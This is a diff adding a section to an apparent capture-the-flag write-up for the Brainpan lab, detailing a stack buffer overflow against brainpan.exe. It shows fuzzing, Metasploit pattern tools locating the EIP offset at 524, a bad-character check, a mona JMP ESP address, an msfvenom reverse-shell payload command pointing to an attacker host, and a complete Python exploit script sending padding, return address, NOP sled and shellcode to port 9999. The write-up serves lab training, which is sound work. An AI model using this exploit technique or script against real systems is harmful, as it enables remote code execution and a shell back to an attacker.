@@ -64,3 +64,83 @@ It’s a Windows binary, 32‑bit, compiled for x86.
 
 Windows 4.00
 This corresponds to Windows NT 4.0 era toolchains — extremely old.
+
+### Test brainpan.exe
+
+- Loaded on a Windows 8 VM in immunity I used a python script to send 100,200, and 1000 Ascii character \x41 or A. Only when 2000 used did it crash the application. 
+- To determine the EIP next I used msf-pattern_create -l 1000 then determined its position of EIP offset with msf-pattern_offset -q <4 characters in EIP>
+
+```
+└─$ msf-pattern_create -l 2000
+Aa0Aa1Aa2Aa3A...
+...
+└─$ nc Target_IP 9999
+_|                            _|                                        
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|                          
+                                            _|
+
+[________________________ WELCOME TO BRAINPAN _________________________]
+                          ENTER THE PASSWORD                              
+
+                          >> Aa0Aa1Aa2A...
+...
+└─$ msf-pattern_offset -q 35724134
+[*] Exact match at offset 524
+                                         
+```
+Now offset determined, next quick look at badchar that might affect it.
+- Ran similar python script added 4 * b'B' and added bad char list from \x01 to \xff
+- No clear sign of bad char not displayed, they all appeared visible so assume only \x00 is bad.
+- This also verified EIP offset 524 with EIP filled with 42424242 as expected.
+
+Use Mona to find a JMP ESP gadget to jump to ESP and use its location in the EIP to kick start into the nop sled leading to shellcode. 
+- JMP ESP location best suited was 0x311712f3 
+
+```
+# mona.py output
+
+| Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Details                                                                                       |
+| ---------- | ---------- | ---------- | ------ | ------- | ----- | ----- | -------- | ------ | --------------------------------------------------------------------------------------------- |
+...
+| 0x31170000 | 0x31176000 | 0x00006000 | False  | False   | False | False | False    | False  | -1.0- [brainpan.exe] (C:\Users\Administrator\Desktop\TRYHACKME CTF\Brainpan\brainpan.exe) 0x0 |
+...
+| 0x75500000 | 0x7550a000 | 0x0000a000 | True   | False   | True  | True  | True     | True   | 6.3.9600.17415 [CRYPTBASE.dll] (C:\Windows\SYSTEM32\CRYPTBASE.dll) 0x4540                     |
+...
+----------
+
+## Results
+
+0x311712f3 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [brainpan] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\Administrator\Desktop\TRYHACKME CTF\Brainpan\brainpan.exe), 0x0
+```
+Then that just leads us to preparing a shell code we know its windows so:
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=Attacker_IP LPORT=7777 -b "\x00" -f c   
+```
+Then implement the combined python code: 
+```
+import socket
+import sys
+
+padding = b'A' * 524  
+EIP = b"\xf3\x12\x17\x31"
+nop = b"\x90"  * 16
+shellcode = (b"\xda\xd3\xb8\xa1\x9f\xcf\xe3\xd9\x74\x24\xf4\x5b\x2b\xc9"
+...boring bits
+b"\xb5")
+
+try: 
+	print("Sending payload:...")
+	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect(('Target_IP',9999))
+	s.recv(1024)
+	s.send(padding + EIP + nop + shellcode + b'\r\n')
+	s.close()
+
+except:
+	print("Cannot connect to the server")
+	sys.exit()
+```
